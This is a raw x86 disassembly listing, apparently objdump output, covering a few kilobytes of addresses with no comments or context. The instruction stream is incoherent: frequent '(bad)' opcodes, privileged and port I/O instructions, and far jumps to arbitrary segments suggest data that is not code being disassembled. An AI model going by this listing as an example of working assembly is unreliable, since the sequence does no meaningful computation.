  40fa2a:	fdiv   DWORD PTR [ebp-0x1f]
  40fa2d:	or     al,0x1b
  40fa2f:	cmp    ecx,DWORD PTR es:[edi]
  40fa32:	jb     0x40f9c7
  40fa34:	or     eax,DWORD PTR [ebx-0x3c]
  40fa37:	cmp    eax,0x925ed6c3
  40fa3c:	push   cs
  40fa3d:	ror    BYTE PTR [eax],cl
  40fa3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa40:	pop    ss
  40fa41:	add    BYTE PTR [edi-0xd17345b],dh
  40fa47:	pushf  
  40fa48:	scas   al,BYTE PTR es:[edi]
  40fa49:	mov    eax,ds:0x884ce158
  40fa4e:	pop    es
  40fa4f:	fdivr  DWORD PTR [edx+esi*1]
  40fa52:	imul   edx,DWORD PTR [edx-0x11c780ab],0x19
  40fa59:	inc    esi
  40fa5a:	cmp    eax,0xac90ae23
  40fa5f:	shr    DWORD PTR [edx-0x5cd79b78],cl
  40fa65:	or     DWORD PTR [edx-0x7d],esp
  40fa68:	sub    ch,BYTE PTR [ecx-0x37]
  40fa6b:	in     eax,0x2a
  40fa6d:	inc    esi
  40fa6e:	add    esi,eax
  40fa70:	ss mov ebx,0xad4fb709
  40fa76:	push   edx
  40fa77:	pop    ds
  40fa78:	jae    0x40faf0
  40fa7a:	jl     0x40fafb
  40fa7c:	retf   0x9ba2
  40fa7f:	cmp    ebp,DWORD PTR ds:[esi-0x65d97fa3]
  40fa86:	xchg   esi,eax
  40fa87:	sbb    BYTE PTR [ecx-0x1c43d574],al
  40fa8d:	adc    esi,DWORD PTR [ebp-0x6a]
  40fa90:	aaa    
  40fa91:	jp     0x40fa7c
  40fa93:	cli    
  40fa94:	dec    esp
  40fa95:	repz enter 0x6c00,0xee
  40fa9a:	mov    bl,0x2a
  40fa9c:	ret    
  40fa9d:	and    bh,BYTE PTR [eax]
  40fa9f:	mov    ds:0xccf3c72f,eax
  40faa4:	xchg   edi,eax
  40faa5:	push   0x4b
  40faa7:	ffreep st(5)
  40faa9:	sahf   
  40faaa:	add    ah,dh
  40faac:	jmp    0x40fa8c
  40faae:	push   ss
  40faaf:	dec    eax
  40fab0:	push   0x50eddf33
  40fab5:	hlt    
  40fab6:	jmp    0x40fa97
  40fab8:	sub    ah,dh
  40faba:	xor    ebx,DWORD PTR [ebp+edx*4-0x4136a90e]
  40fac1:	cmp    esi,esi
  40fac3:	mov    esp,0x4414100
  40fac8:	inc    ecx
  40fac9:	aas    
  40faca:	addr16 in eax,dx
  40facc:	(bad)  
  40facd:	enter  0x3124,0xee
  40fad1:	xor    cl,ah
  40fad3:	call   0x4dc7:0x7303a148
  40fada:	sbb    eax,0x2c5f3e8e
  40fadf:	xlat   BYTE PTR ds:[ebx]
  40fae0:	jp     0x40fb4e
  40fae2:	inc    eax
  40fae3:	std    
  40fae4:	test   ecx,eax
  40fae6:	cmp    bh,BYTE PTR [edi]
  40fae8:	xor    DWORD PTR [esi-0x7b],0x4c
  40faec:	ss jns 0x40fa76
  40faef:	out    0x48,eax
  40faf1:	loope  0x40fa90
  40faf3:	sbb    BYTE PTR [ecx],cl
  40faf5:	xchg   ebp,eax
  40faf6:	or     bl,ch
  40faf8:	mov    DWORD PTR [esi-0xc],0x5bd2c93e
  40faff:	dec    ebx
  40fb00:	ss (bad) 
  40fb03:	pop    esp
  40fb04:	out    dx,al
  40fb05:	fwait
  40fb06:	adc    DWORD PTR [esi],0xffffffa0
  40fb09:	adc    eax,0xd1d5f8da
  40fb0e:	xor    BYTE PTR [esi],bl
  40fb10:	(bad)  
  40fb11:	and    al,0x39
  40fb13:	pushf  
  40fb14:	mov    WORD PTR [esi-0x6c551c16],ss
  40fb1a:	and    al,0x9d
  40fb1c:	inc    ebx
  40fb1d:	lods   eax,DWORD PTR ds:[esi]
  40fb1e:	adc    eax,0xd6428be1
  40fb23:	sahf   
  40fb24:	dec    esi
  40fb25:	cwde   
  40fb26:	test   ebx,edi
  40fb28:	pop    ebp
  40fb29:	adc    al,0xe4
  40fb2b:	and    BYTE PTR [edi],dl
  40fb2d:	jge    0x40fad4
  40fb2f:	ja     0x40faff
  40fb31:	arpl   ax,cx
  40fb33:	cmp    ah,BYTE PTR [edx-0x4d]
  40fb36:	cld    
  40fb37:	push   ebx
  40fb38:	jne    0x40fb5b
  40fb3a:	jmp    0x6a5f:0x774c4e0a
  40fb41:	cmp    DWORD PTR ds:0xd950c219,ebx
  40fb47:	idiv   BYTE PTR [ebx+0x74d136e1]
  40fb4d:	pop    eax
  40fb4e:	push   ecx
  40fb4f:	ret    0xddda
  40fb52:	mov    bl,0x68
  40fb54:	push   ebx
  40fb55:	mov    ds:0xff0d4fe8,al
  40fb5a:	dec    edi
  40fb5b:	shr    edx,1
  40fb5d:	fsubr  st(4),st
  40fb5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb60:	sti    
  40fb61:	push   edx
  40fb62:	lods   al,BYTE PTR ds:[esi]
  40fb63:	arpl   WORD PTR [eax+0x44],sp
  40fb66:	daa    
  40fb67:	jp     0x40fb3a
  40fb69:	enterw 0x8bd3,0x64
  40fb6e:	mov    al,0xb8
  40fb70:	push   0x28
  40fb72:	icebp  
  40fb73:	xchg   ebp,eax
  40fb74:	xchg   esp,eax
  40fb75:	jge    0x40fb11
  40fb77:	dec    esp
  40fb78:	push   edx
  40fb79:	imul   eax,DWORD PTR [eax-0x4],0xbe1c9bc6
  40fb80:	jle    0x40fba0
  40fb82:	pmulhw mm2,QWORD PTR [edi]
  40fb85:	scas   eax,DWORD PTR es:[edi]
  40fb86:	cmp    BYTE PTR [esi-0x2fa3911],0xed
  40fb8d:	inc    esp
  40fb8e:	add    BYTE PTR [esi],dl
  40fb90:	dec    eax
  40fb91:	lods   eax,DWORD PTR ds:[esi]
  40fb92:	dec    edi
  40fb93:	pop    ss
  40fb94:	sub    eax,0x5baf2d0
  40fb99:	mov    ebx,0xe4bc7545
  40fb9e:	out    dx,eax
  40fb9f:	or     eax,0x8ae7c628
  40fba4:	mov    eax,0xee83af4d
  40fba9:	stos   DWORD PTR es:[edi],eax
  40fbaa:	and    ecx,DWORD PTR [eax+0x1a6092eb]
  40fbb0:	xor    ch,BYTE PTR [edx+0x9]
  40fbb3:	ret    
  40fbb4:	push   0xc9eda695
  40fbb9:	mov    eax,ds:0xdf8846ee
  40fbbe:	cmp    esi,DWORD PTR [esi-0x19]
  40fbc1:	add    dh,bh
  40fbc3:	loopne 0x40fbcd
  40fbc5:	push   0x2c
  40fbc7:	lods   eax,DWORD PTR ds:[esi]
  40fbc8:	ret    
  40fbc9:	sub    BYTE PTR [ebx],0xc7
  40fbcc:	sar    dl,1
  40fbce:	int    0x4e
  40fbd0:	out    0x79,eax
  40fbd2:	repnz push 0x66
  40fbd5:	ins    BYTE PTR es:[edi],dx
  40fbd6:	sbb    ah,bh
  40fbd8:	jns    0x40fb9a
  40fbda:	rcr    BYTE PTR [edx],1
  40fbdc:	sar    DWORD PTR [eax-0x3c],0x57
  40fbe0:	or     BYTE PTR cs:[edi+0x53],dl
  40fbe4:	jge    0x40fbda
  40fbe6:	not    DWORD PTR [esi+0x53]
  40fbe9:	jbe    0x40fbc2
  40fbeb:	xor    DWORD PTR [edi],edx
  40fbed:	cmp    eax,0x5f2f96b2
  40fbf2:	aaa    
  40fbf3:	xchg   esi,eax
  40fbf4:	mov    ebp,0x93f43836
  40fbf9:	or     bl,BYTE PTR [ecx+0x3c42fbbf]
  40fbff:	(bad)  
  40fc00:	das    
  40fc01:	(bad)  
  40fc03:	pusha  
  40fc04:	fadd   QWORD PTR [ebx+0x566830bf]
  40fc0a:	std    
  40fc0b:	jno    0x40fbd4
  40fc0d:	pop    esp
  40fc0e:	aam    0xa
  40fc10:	inc    ebx
  40fc11:	dec    edi
  40fc12:	ficomp DWORD PTR [esi]
  40fc14:	loop   0x40fc41
  40fc16:	imul   ecx,esi,0xf4d1d807
  40fc1c:	pop    edx
  40fc1d:	test   ebx,esp
  40fc1f:	or     bh,BYTE PTR ds:0x3db540e8
  40fc25:	inc    eax
  40fc26:	popa   
  40fc27:	mov    esp,0xf05c6cbe
  40fc2c:	or     DWORD PTR [ebx+0x2b],ecx
  40fc2f:	mov    ah,BYTE PTR [eax]
  40fc31:	imul   edx,DWORD PTR [edx-0x10],0x25
  40fc35:	xchg   ebp,eax
  40fc36:	test   edx,ebx
  40fc38:	jmp    0x40fbe0
  40fc3a:	in     al,0xa
  40fc3c:	mov    cl,0xac
  40fc3e:	imul   eax,ecx,0x5dee7020
  40fc44:	push   0xffffffe3
  40fc46:	or     al,0xad
  40fc48:	stc    
  40fc49:	call   DWORD PTR [ebx+0x4ba07e18]
  40fc4f:	sbb    DWORD PTR [ebx],esi
  40fc51:	inc    ecx
  40fc52:	push   ebp
  40fc53:	call   0x2ddf:0xf90a3021
  40fc5a:	aam    0x41
  40fc5c:	push   cs
  40fc5d:	or     esp,DWORD PTR [edi+eax*4]
  40fc60:	or     DWORD PTR [eax],0xffffffa1
  40fc63:	sahf   
  40fc64:	add    al,cl
  40fc66:	mov    ds:0xe0c4f33,al
  40fc6b:	add    al,0x5f
  40fc6d:	enter  0x63a7,0x83
  40fc71:	stos   DWORD PTR es:[edi],eax
  40fc72:	pop    edi
  40fc73:	enter  0x5529,0x31
  40fc77:	call   0xfd62:0x60692d4a
  40fc7e:	cmp    ebx,edi
  40fc80:	(bad)  
  40fc82:	jno    0x40fcab
  40fc84:	push   edi
  40fc85:	mov    esi,0x6c14af11
  40fc8a:	jno    0x40fc27
  40fc8c:	or     al,0xdf
  40fc8e:	or     al,0x8a
  40fc90:	lds    edx,FWORD PTR [edi-0x5]
  40fc93:	cwde   
  40fc94:	fisttp QWORD PTR [ebx+0x6d]
  40fc97:	gs sub eax,0xab1f1a24
  40fc9d:	xlat   BYTE PTR ds:[ebx]
  40fc9e:	or     ch,BYTE PTR es:[ecx]
  40fca1:	sub    DWORD PTR ds:0x9dbe1130,0x38
  40fca8:	mov    bl,0x51
  40fcaa:	adc    BYTE PTR [ecx],bh
  40fcac:	push   ds
  40fcad:	xchg   esi,eax
  40fcae:	sub    esi,DWORD PTR [edi+0x54]
  40fcb1:	fwait
  40fcb2:	daa    
  40fcb3:	xchg   ecx,ebp
  40fcb5:	js     0x40fc77
  40fcb7:	pusha  
  40fcb8:	inc    ebp
  40fcb9:	and    ah,BYTE PTR [edx*4+0x4d85fbda]
  40fcc0:	(bad)  
  40fcc1:	cmc    
  40fcc2:	popa   
  40fcc3:	je     0x40fc8b
  40fcc5:	retf   0x24a0
  40fcc8:	pop    esi
  40fcc9:	test   dh,al
  40fccb:	loopne 0x40fc95
  40fccd:	cwde   
  40fcce:	push   0x91f78243
  40fcd3:	nop
  40fcd4:	push   eax
  40fcd5:	mov    esi,0x84b7b9f0
  40fcda:	jp     0x40fd42
  40fcdc:	dec    eax
  40fcdd:	outs   dx,BYTE PTR ds:[esi]
  40fcde:	add    al,0x6f
  40fce0:	aam    0x7c
  40fce2:	and    al,0x69
  40fce4:	xchg   esi,eax
  40fce5:	sti    
  40fce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fce7:	nop
  40fce8:	mov    bh,0x10
  40fcea:	int3   
  40fceb:	pop    ecx
  40fcec:	jmp    0xa1de:0x782a835c
  40fcf3:	mov    ds:0x5f943929,eax
  40fcf8:	(bad)  
  40fcf9:	dec    esp
  40fcfa:	and    DWORD PTR ds:0x59bbd5d4,ebp
  40fd00:	js     0x40fce0
  40fd02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd03:	sub    eax,0x9ea741b7
  40fd08:	scas   al,BYTE PTR es:[edi]
  40fd09:	cwde   
  40fd0a:	outs   dx,DWORD PTR ds:[esi]
  40fd0b:	rcl    DWORD PTR [eax+0x1f59ebe9],cl
  40fd11:	sub    DWORD PTR [eax],edx
  40fd13:	ret    
  40fd14:	xor    esp,0x43
  40fd17:	adc    al,0xa0
  40fd19:	inc    ecx
  40fd1a:	ror    BYTE PTR [ecx-0x32],1
  40fd1d:	mov    dl,0xd9
  40fd1f:	cmp    ebx,DWORD PTR [ecx-0x21]
  40fd22:	adc    esp,edx
  40fd24:	push   es
  40fd25:	stos   DWORD PTR es:[edi],eax
  40fd26:	out    dx,al
  40fd27:	aam    0xf5
  40fd29:	or     ecx,DWORD PTR [ecx-0x58]
  40fd2c:	nop
  40fd2d:	(bad)  
  40fd2e:	shl    BYTE PTR [edx+ebx*1],1
  40fd31:	push   edi
  40fd32:	icebp  
  40fd33:	ret    
  40fd34:	enter  0xc6f6,0xf9
  40fd38:	sbb    bh,BYTE PTR [ecx]
  40fd3a:	add    eax,0xe7a1b741
  40fd3f:	ins    DWORD PTR es:[edi],dx
  40fd40:	add    BYTE PTR [esi-0x5d],bl
  40fd43:	call   0x89eb9f24
  40fd48:	les    esi,FWORD PTR [ebx+0x735a9457]
  40fd4e:	xor    eax,0x25577db3
  40fd53:	stos   BYTE PTR es:[edi],al
  40fd54:	or     BYTE PTR [edx+0x34b80bde],ch
  40fd5a:	dec    ebp
  40fd5b:	cli    
  40fd5c:	das    
  40fd5d:	jle    0x40fdcd
  40fd5f:	dec    esp
  40fd60:	pop    eax
  40fd61:	js     0x40fdd1
  40fd63:	std    
  40fd64:	das    
  40fd65:	fistp  WORD PTR [esi-0x1b]
  40fd68:	das    
  40fd69:	sar    DWORD PTR [edx+edx*2+0x57937daf],cl
  40fd70:	sbb    eax,0x33c87899
  40fd75:	cmc    
  40fd76:	add    BYTE PTR [edi],dl
  40fd78:	scas   al,BYTE PTR es:[edi]
  40fd79:	popa   
  40fd7a:	xor    bh,BYTE PTR [ebp+0x32]
  40fd7d:	sar    DWORD PTR [ebp+0x5b],0xa4
  40fd81:	mov    bh,BYTE PTR [ebx]
  40fd83:	aad    0x39
  40fd85:	scas   eax,DWORD PTR es:[edi]
  40fd86:	es sahf 
  40fd88:	int3   
  40fd89:	mov    cl,0x26
  40fd8b:	sub    bl,bl
  40fd8d:	mov    BYTE PTR [ebx+0xe],ah
  40fd90:	aad    0xe0
  40fd92:	out    dx,al
  40fd93:	dec    esi
  40fd94:	iret   
  40fd95:	test   BYTE PTR [edi+0x29774d1b],bh
  40fd9b:	inc    esp
  40fd9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd9d:	jmp    0xec09:0x769cc97d
  40fda4:	mov    ebx,0x803080e8
  40fda9:	aad    0x56
  40fdab:	cmp    al,0xc3
  40fdad:	(bad)  
  40fdae:	stc    
  40fdaf:	dec    ebp
  40fdb0:	daa    
  40fdb1:	stos   BYTE PTR es:[edi],al
  40fdb2:	rol    bh,1
  40fdb4:	sub    esi,DWORD PTR [eax+0x73d4bc2]
  40fdba:	xchg   esi,eax
  40fdbb:	out    dx,eax
  40fdbc:	mov    BYTE PTR [ebp-0x18],dl
  40fdbf:	call   0x4442efd8
  40fdc4:	je     0x40fde6
  40fdc6:	mov    edx,0xdfd13e23
  40fdcb:	push   es
  40fdcc:	mov    edi,?
  40fdce:	repnz ss in al,dx
  40fdd1:	dec    ebx
  40fdd2:	add    ecx,DWORD PTR [esp+edi*1-0x74]
  40fdd6:	jbe    0x40fe4e
  40fdd8:	rcr    BYTE PTR [eax-0x256e63c0],0xe0
  40fddf:	xchg   ebx,eax
  40fde0:	sbb    DWORD PTR [edi+0x5],ebp
  40fde3:	repnz push ebx
  40fde5:	add    BYTE PTR [eax],cl
  40fde7:	inc    edx
  40fde8:	dec    edx
  40fde9:	outs   dx,BYTE PTR es:[esi]
  40fdeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdec:	(bad)  
  40fdee:	pop    esi
  40fdef:	pushf  
  40fdf0:	loop   0x40fe4c
  40fdf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdf3:	pop    ecx
  40fdf4:	cs popf 
  40fdf6:	push   eax
  40fdf7:	imul   edi,eax,0xffffff87
  40fdfa:	xchg   DWORD PTR [edx-0x17511364],ebx
  40fe00:	aas    
  40fe01:	push   eax
  40fe02:	mov    al,0xb7
  40fe04:	dec    edx
  40fe05:	jnp    0x40fe71
  40fe07:	fucomi st,st(1)
  40fe09:	adc    DWORD PTR [edi-0x19],ebx
  40fe0c:	hlt    
  40fe0d:	outs   dx,BYTE PTR ds:[esi]
  40fe0e:	jns    0x40fe6d
  40fe10:	jo     0x40fdf5
  40fe12:	cmp    ch,BYTE PTR [ebx*2+0x428958d9]
  40fe19:	retf   0x9c4c
  40fe1c:	sub    al,0xcb
  40fe1e:	sub    ecx,edx
  40fe20:	mov    al,0x19
  40fe22:	push   esi
  40fe23:	into   
  40fe24:	pmulhw mm5,QWORD PTR [eax-0x3597695f]
  40fe2b:	xchg   BYTE PTR [ebp+0x37],bl
  40fe2e:	add    ebx,DWORD PTR [ecx+edx*8-0x5ffe58f9]
  40fe35:	loope  0x40fe20
  40fe37:	mov    dh,BYTE PTR [eax]
  40fe39:	out    0xf3,eax
  40fe3b:	adc    edx,DWORD PTR [esi+0x50988525]
  40fe41:	sar    BYTE PTR es:[eax-0x74463495],0xed
  40fe49:	clc    
  40fe4a:	mov    ebp,0xd0a2bb8d
  40fe4f:	aas    
  40fe50:	and    esi,DWORD PTR [ebp-0xc80d2a7]
  40fe56:	mov    esi,0xd4641696
  40fe5b:	push   cs
  40fe5c:	xchg   esp,eax
  40fe5d:	mov    edi,0x757b87ac
  40fe62:	adc    al,BYTE PTR [ebp+0x2c3d7154]
  40fe68:	(bad)  
  40fe6a:	(bad)  
  40fe6b:	jp     0x40fe2b
  40fe6d:	cmp    BYTE PTR [ebx+0x6e],dh
  40fe70:	xor    edi,ebp
  40fe72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe73:	and    edx,DWORD PTR [eax-0xc]
  40fe76:	push   0x6f
  40fe78:	aas    
  40fe79:	sbb    DWORD PTR [edi-0x1d],0xffffffa9
  40fe7d:	sbb    al,0xae
  40fe7f:	das    
  40fe80:	xlat   BYTE PTR ds:[ebx]
  40fe81:	leave  
  40fe82:	inc    esi
  40fe83:	call   0xcf09:0x72945bb2
  40fe8a:	or     eax,0x50016816
  40fe8f:	test   al,0xf0
  40fe91:	dec    esp
  40fe92:	mov    eax,0x52f7a90c
  40fe97:	and    esi,DWORD PTR [edx-0x7b2084b4]
  40fe9d:	push   esp
  40fe9e:	aaa    
  40fe9f:	pop    es
  40fea0:	or     bh,BYTE PTR [eax+ebx*1+0x52f49b32]
  40fea7:	cmp    BYTE PTR [ebp+0x3f072e43],bh
  40fead:	cwde   
  40feae:	dec    ecx
  40feaf:	pop    edx
  40feb0:	pop    es
  40feb1:	retf   0x606f
  40feb4:	nop
  40feb5:	add    edx,DWORD PTR [ecx-0x5a]
  40feb8:	(bad)  [esi+0x70676f5f]
  40febe:	mov    bl,0x5b
  40fec0:	jno    0x40ff2c
  40fec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fec3:	sbb    esi,DWORD PTR [edi-0x46]
  40fec6:	std    
  40fec7:	pop    ebx
  40fec8:	inc    ebp
  40fec9:	int3   
  40feca:	pop    ebx
  40fecb:	std    
  40fecc:	mul    DWORD PTR [eax]
  40fece:	or     dl,bl
  40fed0:	pop    esi
  40fed1:	dec    edx
  40fed2:	push   es
  40fed3:	add    al,0x3b
  40fed5:	jp     0x40fe67
  40fed7:	out    dx,eax
  40fed8:	cmp    eax,edx
  40feda:	cmp    eax,0xe6f7e11a
  40fedf:	les    esi,FWORD PTR [ecx+0x3f]
  40fee2:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40fee4:	lahf   
  40fee5:	retf   0xe6f2
  40fee8:	cmp    cl,BYTE PTR [edx]
  40feea:	daa    
  40feeb:	gs aas 
  40feed:	and    BYTE PTR [eax-0x6d],bh
  40fef0:	sub    eax,0xca2567d5
  40fef5:	cmp    DWORD PTR [edx],ebp
  40fef7:	xchg   BYTE PTR [ecx],dh
  40fef9:	ja     0x40fec3
  40fefb:	sub    DWORD PTR [ebx+eax*2+0x15f6d5e9],esp
  40ff02:	addr16 pop edi
  40ff04:	jne    0x40ff50
  40ff06:	mov    al,ds:0xa6d7fb6
  40ff0b:	jge    0x40ff17
  40ff0d:	pop    ss
  40ff0e:	xchg   ecx,eax
  40ff0f:	sbb    eax,0x848bc972
  40ff14:	enter  0xeaa5,0x2
  40ff18:	or     ah,BYTE PTR [edx+0x2b]
  40ff1b:	adc    BYTE PTR [ebp+ebp*1+0x3a127ce1],0x44
  40ff23:	xor    esp,esi
  40ff25:	mov    ss,ecx
  40ff27:	pushf  
  40ff28:	in     eax,0xaa
  40ff2a:	mov    dl,0x7a
  40ff2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff2d:	es cmp ecx,esi
  40ff30:	push   edi
  40ff31:	icebp  
  40ff32:	cmp    dl,BYTE PTR [ebx+edx*4+0x53]
  40ff36:	js     0x40ff3b
  40ff38:	nop    DWORD PTR [eax-0x64]
  40ff3c:	jp     0x40ff32
  40ff3e:	fwait
  40ff3f:	es dec ebx
  40ff41:	pop    edi
  40ff42:	stos   DWORD PTR es:[edi],eax
  40ff43:	dec    edi
  40ff44:	or     bl,cl
  40ff46:	xor    dh,BYTE PTR ds:0xc237e514
  40ff4c:	lea    eax,[edx-0x2722af0f]
  40ff52:	mov    ah,BYTE PTR [eax-0xc]
  40ff55:	fsubr  st,st(6)
  40ff57:	jae    0x40fedb
  40ff59:	jp     0x40ff7c
  40ff5b:	fild   DWORD PTR [esi]
  40ff5d:	scas   eax,DWORD PTR es:[edi]
  40ff5e:	mov    ah,0x10
  40ff60:	dec    esi
  40ff61:	(bad)  
  40ff62:	jb     0x40ff28
  40ff64:	pop    esi
  40ff65:	jno    0x40ff89
  40ff67:	xchg   ecx,eax
  40ff68:	in     eax,dx
  40ff69:	fstp   DWORD PTR [ebx-0x34]
  40ff6c:	inc    esp
  40ff6d:	loope  0x40ff07
  40ff6f:	imul   ebp,DWORD PTR ds:0x5bf3d61e,0x156f13da
  40ff79:	and    al,0x7f
  40ff7b:	sub    eax,0xe9b9512a
  40ff80:	xor    BYTE PTR [esi+0x36c1333d],cl
  40ff86:	pop    ebx
  40ff87:	pop    es
  40ff88:	jae    0x40ff39
  40ff8a:	pop    ss
  40ff8b:	jl     0x40ff4e
  40ff8d:	and    ebx,DWORD PTR [edi+edi*1+0x249e77]
  40ff94:	xor    al,0x1b
  40ff96:	push   ds
  40ff97:	int    0xb8
  40ff99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff9a:	mov    cl,0x5d
  40ff9c:	ds sbb eax,0xbe479fe0
  40ffa2:	pop    eax
  40ffa3:	pop    esi
  40ffa4:	pusha  
  40ffa5:	mov    al,0x52
  40ffa7:	loopne 0x410025
  40ffa9:	push   0xe82fb80d
  40ffae:	push   esi
  40ffaf:	bound  ebx,QWORD PTR [eax-0x2abe847a]
  40ffb5:	lods   eax,DWORD PTR ds:[esi]
  40ffb6:	xchg   BYTE PTR [ebx],ch
  40ffb8:	jg     0x40ff87
  40ffba:	mov    ch,0x97
  40ffbc:	sar    BYTE PTR [edx],1
  40ffbe:	adc    edi,DWORD PTR [ebx]
  40ffc0:	dec    ebx
  40ffc1:	outs   dx,BYTE PTR ds:[esi]
  40ffc2:	std    
  40ffc3:	sbb    dl,bl
  40ffc5:	add    dl,BYTE PTR [ebp+0x1e1c8e78]
  40ffcb:	sbb    BYTE PTR [edx+ecx*8+0x5c],cl
  40ffcf:	not    DWORD PTR [eax+0x38]
  40ffd2:	add    dl,BYTE PTR [si-0x63]
  40ffd6:	(bad)  
  40ffd8:	mov    al,ds:0x66a4d267
  40ffdd:	stos   BYTE PTR es:[edi],al
  40ffde:	retf   0xf791
  40ffe1:	sbb    eax,0x96521d20
  40ffe6:	push   esi
  40ffe7:	xchg   bl,bh
  40ffe9:	jp     0x41003d
  40ffeb:	adc    al,0xa
  40ffed:	push   0x11
  40ffef:	add    cl,BYTE PTR [ebx+0x76]
  40fff2:	pop    eax
  40fff3:	sahf   
  40fff4:	jmp    0x739381d4
  40fff9:	mov    eax,0x309834a1
  40fffe:	mov    edi,0x127e2f23
  410003:	mov    bh,0x4a
  410005:	fdiv   st,st(0)
  410007:	in     eax,0x27
  410009:	stc    
  41000a:	pop    esp
  41000b:	test   ebx,edx
  41000d:	repnz xor bh,BYTE PTR [esi-0x44]
  410011:	jne    0x410015
  410013:	lahf   
  410014:	jp     0x41002d
  410016:	into   
  410017:	jne    0x410055
  410019:	jmp    0xaffa1310
  41001e:	out    dx,al
  41001f:	loopne 0x41004c
  410021:	gs cmc 
  410023:	jle    0x410082
  410025:	outs   dx,BYTE PTR ds:[esi]
  410026:	sahf   
  410027:	add    al,0x93
  410029:	int    0xc1
  41002b:	and    ch,BYTE PTR [ecx]
  41002d:	mov    cl,0x55
  41002f:	in     al,0xc2
  410031:	push   ecx
  410032:	imul   BYTE PTR [ecx-0x26]
  410035:	jecxz  0x410035
  410037:	arpl   WORD PTR [edi],si
  410039:	push   ecx
  41003a:	pop    edi
  41003b:	sub    cl,bh
  41003d:	fs (bad) 
  41003f:	mov    ebx,fs
  410041:	sub    esi,edx
  410043:	add    BYTE PTR [ebx-0x1c11bb14],dl
  410049:	mov    al,ds:0x5565cab7
  41004e:	inc    ebp
  41004f:	cld    
  410050:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410051:	pusha  
  410052:	(bad)  
  410053:	cmp    BYTE PTR [edx+0x668ace5],al
  410059:	dec    eax
  41005a:	jb     0x41006a
  41005c:	out    dx,eax
  41005d:	sbb    al,BYTE PTR ds:0x489f402b
  410063:	jmp    0xaaeb5c95
  410068:	gs icebp 
  41006a:	push   eax
  41006b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41006c:	out    dx,eax
  41006d:	sbb    ch,BYTE PTR [bx]
  410070:	push   ss
  410071:	(bad)  
  410073:	cld    
  410074:	call   0xbf37:0x477ff452
  41007b:	sar    edx,0x46
  41007e:	shl    edi,1
  410080:	jnp    0x4100b6
  410082:	mov    eax,0x665ed1d0
  410087:	xchg   ecx,eax
  410088:	pop    ds
  410089:	and    al,0xe8
  41008b:	sbb    eax,0x3b51ef4f
  410090:	ins    BYTE PTR es:[edi],dx
  410091:	aad    0x9
  410093:	add    ah,BYTE PTR ds:0x37863ee1
  410099:	clc    
  41009a:	std    
  41009b:	xor    bl,BYTE PTR [edx+0x1b90cc8f]
  4100a1:	sti    
  4100a2:	push   esi
  4100a3:	sbb    cl,BYTE PTR [esi]
  4100a5:	mov    esp,0x9e21106a
  4100aa:	xchg   ecx,eax
  4100ab:	mov    ds:0x6ecdbea,al
  4100b0:	stos   BYTE PTR es:[edi],al
  4100b1:	inc    esi
  4100b2:	mov    al,ds:0x9a2bb6ad
  4100b7:	xchg   ebp,eax
  4100b8:	test   esp,ecx
  4100ba:	push   eax
  4100bb:	sbb    al,0x30
  4100bd:	dec    edx
  4100be:	scas   eax,DWORD PTR es:[edi]
  4100bf:	mov    bl,0xdb
  4100c1:	(bad)  
  4100c2:	into   
  4100c3:	ja     0x410091
  4100c5:	jecxz  0x410129
  4100c7:	dec    esi
  4100c8:	into   
  4100c9:	dec    esi
  4100ca:	mov    ?,WORD PTR [ecx-0x6e34197a]
  4100d0:	lods   al,BYTE PTR ds:[esi]
  4100d1:	sbb    edi,edx
  4100d3:	std    
  4100d4:	cmp    al,0xa8
  4100d6:	cmp    BYTE PTR [esi+0x69353a48],bl
  4100dc:	outs   dx,BYTE PTR ds:[esi]
  4100dd:	mov    edi,0xafdd65a3
  4100e2:	mov    ds:0x58e26dae,eax
  4100e7:	pushf  
  4100e8:	aad    0xf7
  4100ea:	(bad)
  4100ed:	adc    al,BYTE PTR [edi-0x4b4b1da3]
  4100f3:	and    edx,ebx
  4100f5:	xchg   edx,eax
  4100f6:	pop    ds
  4100f7:	leave  
  4100f8:	in     eax,dx
  4100f9:	adc    al,0x87
  4100fb:	inc    ecx
  4100fc:	popa   
  4100fd:	outs   dx,DWORD PTR ds:[esi]
  4100fe:	fs inc ecx
  410100:	outs   dx,BYTE PTR ds:[esi]
  410101:	add    al,bh
  410103:	sub    eax,0x2560d899
  410108:	jp     0x4100f7
  41010a:	cmc    
  41010b:	call   0x8fe54d7d
  410110:	mov    ds:0x1a333f5c,al
  410115:	in     al,0xe
  410117:	cmp    BYTE PTR fs:[edi+eax*2-0x7a],dh
  41011c:	div    BYTE PTR [eax-0x11f427d2]
  410122:	ja     0x4100c3
  410124:	jbe    0x410162
  410126:	in     eax,dx
  410127:	mov    ds:0x428b0a9,al
  41012c:	mov    cs,WORD PTR [eax-0x688e44d]
  410132:	scas   eax,DWORD PTR es:[edi]
  410133:	leave  
  410134:	inc    ebx
  410135:	jl     0x41018e
  410137:	cmp    DWORD PTR [eiz*8-0x1b8d411f],edx
  41013e:	shr    BYTE PTR [edx-0x23],1
  410141:	ret    
  410142:	mov    esp,0x7da325eb
  410147:	and    ecx,DWORD PTR [edx+ecx*2+0x7bf7f6fe]
  41014e:	mov    edi,0xb110c470
  410153:	pop    esi
  410154:	jns    0x410111
  410156:	(bad)  
  410158:	int3   
  410159:	fdivr  QWORD PTR [esi+0x3f]
  41015c:	push   ebx
  41015d:	mov    al,0x58
  41015f:	jecxz  0x410122
  410161:	rcr    BYTE PTR [edi],cl
  410163:	mov    al,ds:0x86aaf8fa
  410168:	add    BYTE PTR [ebx+0x54959b17],dh
  41016e:	sbb    DWORD PTR [ebp-0x11f8d1bd],edx
  410174:	fld    DWORD PTR [ecx+0x26e78a68]
  41017a:	test   DWORD PTR [edx-0x361e1beb],0xf59937cc
